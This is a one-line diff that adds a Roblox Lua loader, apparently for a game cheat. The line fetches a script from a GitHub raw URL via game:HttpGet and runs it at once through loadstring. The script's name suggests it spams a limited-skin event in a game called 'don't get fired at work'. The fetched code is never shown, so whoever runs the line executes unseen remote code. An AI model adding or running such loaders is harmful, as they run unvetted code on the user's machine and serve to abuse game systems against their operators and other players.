@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/don-t-get-fired-at-work-limited-skin-eve-spam5-ne115sidgzrg3h.lua"))()
